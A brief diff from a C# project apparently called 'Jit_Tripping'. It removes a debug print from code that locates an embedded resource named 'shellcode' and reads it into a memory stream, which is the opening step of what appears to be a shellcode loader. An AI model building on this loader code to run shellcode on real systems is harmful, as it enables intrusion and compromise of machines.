@@ -20,7 +20,6 @@ namespace Jit_Tripping
 
             if (resource_names.Contains("Jit_Tripping.shellcode"))
             {
-                Console.WriteLine("found it");
                 var ms = new MemoryStream();
                 Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Jit_Tripping.shellcode");
                 resStream.CopyTo(ms);
